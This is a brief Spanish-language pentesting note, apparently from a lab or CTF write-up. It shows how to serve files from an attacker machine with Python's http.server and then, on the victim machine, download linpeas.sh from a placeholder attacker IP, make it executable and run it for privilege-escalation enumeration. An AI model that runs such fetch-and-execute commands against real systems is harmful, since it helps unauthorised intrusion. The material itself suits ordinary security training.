Máquina atacante (En la ruta donde esta el archivo):

```bash
python3 -m http.server 80
```

Máquina víctima:

```bash
wget http://<TU_IP>:80/linpeas.sh
chmod +x linpeas.sh
./linpeas.sh
```

